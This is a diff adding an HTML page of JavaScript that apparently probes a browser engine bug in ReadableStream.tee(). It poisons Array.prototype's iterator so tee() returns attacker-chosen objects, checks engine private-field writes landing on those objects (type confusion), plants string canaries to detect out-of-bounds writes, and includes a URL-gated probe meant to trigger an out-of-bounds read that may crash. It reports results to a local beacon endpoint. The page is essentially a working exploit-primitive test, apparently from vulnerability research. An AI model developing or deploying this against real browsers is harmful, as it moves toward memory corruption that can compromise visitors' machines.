@@ -1,0 +1,176 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"><title>FA-v8 — SAFE-FIRST 10-variant battery + non-crashing OOB-write witness</title></head>
+<body><pre id="out">FA-v8 — AXIOM: every tee() yields >=2 OBJECTS (never a primitive, never <2)
+  => results.size()>=2, both Strong slots CONSTRUCTED => InternalReadableStream.cpp:195
+     is always in-bounds with real cells => V0..V9 cannot reach the crash node.
+  escape hatches: #x1 gated slot-1 probe (NOT default) ; #sN re-runs one variant after a reload.
+</pre><script>
+(function(){
+ "use strict";
+ var RID = "fv8" + Date.now().toString(36) + "-" + Math.floor(Math.random()*1e6).toString(36);   // nonce (NOT named `run`: that is the runner fn)
+ var out = document.getElementById("out");
+ function say(s){ try { out.appendChild(document.createTextNode("\n"+s)); } catch(e){} }
+ function beacon(st, body){
+   try { var x = new XMLHttpRequest(); x.open("POST", "/beacon/FV8-"+st+"/"+RID, false);
+     x.setRequestHeader("Content-Type","application/json");
+     x.send(JSON.stringify({body:String(body).slice(0,400)})); } catch(e){ say("beacon-err "+st); }
+ }
+ var origIter = Array.prototype[Symbol.iterator];
+ var HB = 0, hbT = setInterval(function(){ try { var x = new XMLHttpRequest();
+   x.open("POST","/beacon/HB/"+RID+"/"+(HB++), false); x.send(""); } catch(e){} }, 2000);
+ function restore(){ try { Array.prototype[Symbol.iterator] = origIter; } catch(e){} }
+  function fake(tag){ var o = {}; o.__tag = tag; return o; }  // deputy writes land because @assert is release-stripped (NodesCodegen.cpp:1290-1295) + locked-check passes (reader=undefined)
+  function syms(o){ try { return Object.getOwnPropertySymbols(o); } catch(e){ return []; } }
+  function own(o){ try { return Object.getOwnPropertyNames(o).sort().join("|") + "+SYM:" + syms(o).length; } catch(e){ return "err"; } }
+  // engine deputy puts use PRIVATE SYMBOLS: @disturbed=>true, @state=>a symbol. String keys NEVER match.
+  function has(o,k){ try { var s = syms(o), i; for (i=0;i<s.length;i++){ var v = o[s[i]];
+      if (k==="disturbed" && v===true) return true;
+      if (k==="state" && typeof v==="symbol") return true; }
+    return Object.prototype.hasOwnProperty.call(o,k); } catch(e){ return false; } }
+  function desc(o,k){ try { var s = syms(o), i; for (i=0;i<s.length;i++){ var v = o[s[i]];
+      if (k==="disturbed" && v===true) return "true";
+      if (k==="state" && typeof v==="symbol") return "sym"; }
+    var d = Object.getOwnPropertyDescriptor(o,k); return d ? String(d.value) : "n/a"; } catch(e){ return "err"; } }
+ var AX = { tee:0, min:99, bad:0 };
+ function mkPoison(k, objs, doStash){
+   if (typeof k !== "number" || k < 2 || !objs || !objs.length) { AX.bad++; throw new Error("AXIOM-VIOLATION k="+k); }
+   for (var j=0;j<objs.length;j++) if (!objs[j] || typeof objs[j] !== "object") { AX.bad++; throw new Error("AXIOM-VIOLATION non-object"); }
+   if (k < AX.min) AX.min = k;
+   return function(){ var arr = this;
+     if (doStash) window.__stash = [arr[0], arr[1]];
+     var i = 0;
+     return { next: function(){ if (i >= k) return {done:true}; var v = objs[i % objs.length]; i++; return {value:v, done:false}; } };
+   };
+ }
+ function run(id, label, poisonFn, work){
+   beacon(id+"A", label);
+   try {
+     var p = poisonFn();                                   // factory throws BEFORE any tee() => fail-closed, no crash
+     try { Array.prototype[Symbol.iterator] = p; } catch(e){ restore(); beacon(id+"E","install-fail"); return; }
+     AX.tee++;
+     var r = work();
+     restore();
+     beacon(id+"B", "survived | "+String(r).slice(0,230));
+   } catch(e){ restore(); beacon(id+"E", "typeErr-guard | "+String(e).slice(0,170)); }
+ }
+ /* ---------- V0 control ---------- */
+ try { beacon("V0A","control unpoisoned");
+   var rs0 = new ReadableStream({}), p0 = rs0.tee();
+   beacon("V0B","BUGLIVE=false;pair.length="+p0.length+";locked="+p0[0].locked+";inst="+(p0[0] instanceof ReadableStream));
+ } catch(e){ beacon("V0E", String(e).slice(0,140)); }
+ /* ---------- V1 sealing of arbitrary objects ---------- */
+ var A1=fake("A1"), B1=fake("B1");
+ run("V1","V1 sealing of arbitrary objects (S1 type confusion)", function(){ return mkPoison(2,[A1,B1],true); }, function(){
+   var pre = own(A1)+" / "+own(B1);
+   var pair = new ReadableStream({}).tee();
+   return "pairLen="+pair.length+";inst="+(pair[0] instanceof ReadableStream)+";pre=["+pre+"];postA=["+own(A1)+"];postB=["+own(B1)+"];stash="+(window.__stash?window.__stash.length:-1);
+ });
+ /* ---------- V2 deputy-write witness (the never-crashing write test) ---------- */
+ var A2=fake("A2"), B2=fake("B2");
+ run("V2","V2 deputy-write witness: putByIdDirectPrivate on attacker-chosen object", function(){ return mkPoison(2,[A2,B2]); }, function(){
+   var pair = new ReadableStream({}).tee();
+   var pre = has(A2,"disturbed");
+   try { pair[0].cancel(); } catch(ec){ say("V2 cancel threw: "+ec); }
+   return "preDisturbed="+pre+";postDisturbed="+has(A2,"disturbed")+";value="+desc(A2,"disturbed")+";ownA=["+own(A2)+"]";
+ });
+ /* ---------- V3 @assert release discriminator ---------- */
+ var A3=fake("A3"), B3=fake("B3");
+ run("V3","V3 @assert-release discriminator (disturbed vs state)", function(){ return mkPoison(2,[A3,B3]); }, function(){
+   var pair = new ReadableStream({}).tee();
+   try { pair[0].cancel(); } catch(ec){}
+   return "disturbed="+has(A3,"disturbed")+";state="+has(A3,"state")+";stateVal="+desc(A3,"state")+";ownA=["+own(A3)+"]";
+ });
+ /* ---------- V4 same object twice: cross-handle read-back ---------- */
+ var A4=fake("A4");
+ run("V4","V4 cross-handle write read-back [A,A]", function(){ return mkPoison(2,[A4,A4]); }, function(){
+   var pair = new ReadableStream({}).tee();
+   var before = own(A4), l1 = "n/a";
+   try { pair[0].cancel(); } catch(ec){}
+   try { l1 = String(pair[1].locked); } catch(e2){ l1 = "throw"; }
+   return "before=["+before+"];after=["+own(A4)+"];disturbed="+has(A4,"disturbed")+";p1locked="+l1;
+ });
+ /* ---------- V5 wrapper-object (nearest safe analogue of SHAPE-W) ---------- */
+ var A5=fake("A5"), S5=new String("SEED-STRING-0123456789");
+ run("V5","V5 JSWrapperObject (new String) beside-write probe", function(){ return mkPoison(2,[A5,S5]); }, function(){
+   var pair = new ReadableStream({}).tee();
+   try { pair[0].cancel(); } catch(ec){}
+   return "wrapperLen="+S5.length+";head="+String(S5).slice(0,10)+";wrapperOwn=["+own(S5)+"];ownA=["+own(A5)+"];disturbedA="+has(A5,"disturbed");
+ });
+ /* ---------- V6 exotic objects ---------- */
+ var U6=new Uint8Array(64), AR6=new Array(16), i6;
+ for (i6=0;i6<64;i6++) U6[i6]=(i6*7)&255;
+ for (i6=0;i6<16;i6++) AR6[i6]=i6*3;
+ var pre6=(function(){ var h=0,i; for(i=0;i<64;i++) h=(h*31+U6[i])>>>0; for(i=0;i<16;i++) h=(h*31+AR6[i])>>>0; return h; })();
+ run("V6","V6 exotic-object wrap (Uint8Array + Array) byte canary", function(){ return mkPoison(2,[U6,AR6]); }, function(){
+   var pair = new ReadableStream({}).tee();
+   try { pair[0].cancel(); } catch(ec){}
+   var h=0,i; for(i=0;i<64;i++) h=(h*31+U6[i])>>>0; for(i=0;i<16;i++) h=(h*31+AR6[i])>>>0;
+   return "bytesBefore="+pre6+";bytesAfter="+h+";flip="+(h!==pre6)+";u00="+U6[0]+";a00="+AR6[0];
+ });
+ /* ---------- V8 second S1 caller: Response(stream).clone() ---------- */
+ var A8=fake("A8"), B8=fake("B8");
+ run("V8","V8 second S1 caller: Response(realStream).clone()", function(){ return mkPoison(2,[A8,B8]); }, function(){
+   var real = new ReadableStream({});
+   var cloned = new Response(real).clone();
+   return "bodyPresent="+(cloned.body != null)+";bodyIsStream="+(cloned.body instanceof ReadableStream)+";ownA=["+own(A8)+"];disturbed="+has(A8,"disturbed");
+ });
+ /* ---------- V7 THE OOB-WRITE TEST: class-128 byte canary (never crashes) ---------- */
+ var CAN_LENS=[96,104,112,120,128], CAN_PER=16, can=[], canExp=[], scanned=0;
+ function canChar(n,i,g){ return 33 + ((n*7 + i*13 + g*29) % 90); }
+ function canaryBuild(){
+   for (var g=0; g<CAN_LENS.length; g++){ var L=CAN_LENS[g], h=0;
+     for (var n=0;n<CAN_PER;n++){ var s=""; for (var i=0;i<L;i++) s += String.fromCharCode(canChar(n,i,g));
+       can.push(s); h=(h*31 + s.length)>>>0; }
+     canExp.push(h);
+   }
+   beacon("V7-PLANT","canaries="+can.length+" lens="+CAN_LENS.join(","));
+ }
+ function canaryScan(g){
+   var base=g*CAN_PER, h=0, bad=-1;
+   for (var n=0;n<CAN_PER;n++){
+     var s=can[base+n], ok=1;
+     try {
+       if (s.length !== CAN_LENS[g]) ok=0;
+       else for (var i=0;i<s.length;i++){ if (s.charCodeAt(i) !== canChar(n,i,g)) { ok=0; break; } }
+     } catch(e){ ok=0; }
+     if (!ok && bad<0) bad=n;
+     h=(h*31 + (s.length||0))>>>0;
+   }
+   scanned++;
+   if (h !== canExp[g]) { beacon("V7-CANARY-FLIP","group="+g+";firstBad="+bad+";exp="+canExp[g]+";got="+h); return false; }
+   beacon("V7-CANARY-OK","group="+g+";digest="+h); return true;
+ }
+ (function(){
+   beacon("V7A","V7 class-128 canary OOB-write witness (the never-crash OOB test)");
+   canaryBuild();
+   var A7=fake("A7"), B7=fake("B7"), verdict="";
+   try {
+     Array.prototype[Symbol.iterator] = mkPoison(2,[A7,B7]);   // k=2 objects => no OOB read possible
+     AX.tee++;
+     var pair = new ReadableStream({}).tee();
+     restore();
+     try { pair[0].cancel(); } catch(ec){}
+     verdict = "OOB-WRITE-NOT-OBSERVED;canaries="+can.length+";disturbed="+has(A7,"disturbed");
+     for (var g=0; g<CAN_LENS.length; g++){ if (!canaryScan(g)) { verdict = "OOB-WRITE-CONFIRMED;group="+g+";canaries="+can.length+";disturbed="+has(A7,"disturbed"); break; } }
+   } catch(e){ restore(); verdict = "V7-inner-throw:"+String(e).slice(0,140); }
+   beacon("V7B", verdict+";scanned="+scanned+"/"+CAN_LENS.length);
+ })();
+ /* ---------- V9 self-audit of the no-crash guarantee ---------- */
+ beacon("V9A","V9 axiom self-audit");
+ beacon("V9B","teeCalls="+AX.tee+";minYield="+AX.min+";violations="+AX.bad+";verdict="+((AX.bad===0&&AX.min>=2)?"AXIOM-HELD(no-crash-guaranteed)":"AXIOM-BROKEN"));
+ /* ---------- optional gated X1 (slot-1 characterisation, may die) ---------- */
+ if (location.hash === "#x1") {
+   beacon("X1A","gated slot-1 probe: zero-seeded under-yield-1-object (may crash; server-side verdict)");
+   try {
+     Array.prototype[Symbol.iterator] = mkPoison(2,[fake("seedA"),fake("seedB")]);
+     new ReadableStream({}).tee();                       // m_size=2 => ~Vector nulls +0/+8 in ITS chunk (Vector.h:749-753)
+     Array.prototype[Symbol.iterator] = function(){ var a=this, i=0; return { next:function(){ if(i>=1) return {done:true}; i++; return {value:{fake:1},done:false}; } }; };
+     var z = new ReadableStream({}).tee();               // size=1 => results[1] reads raw +8
+     restore();
+     beacon("X1B","zombie?;len="+z.length+";locked="+z[1].locked+";own=["+own(z[1])+"]");
+   } catch(e){ restore(); beacon("X1E", String(e).slice(0,150)); }
+ } else { beacon("X1-SKIP","gated; append #x1 to the URL to arm"); }
+ beacon("Z","battery-complete FA-v8 (safe-first, axiom-guarded)");
+ say("FA-v8 battery complete");
+ clearInterval(hbT);
+})();
+</script></body></html>
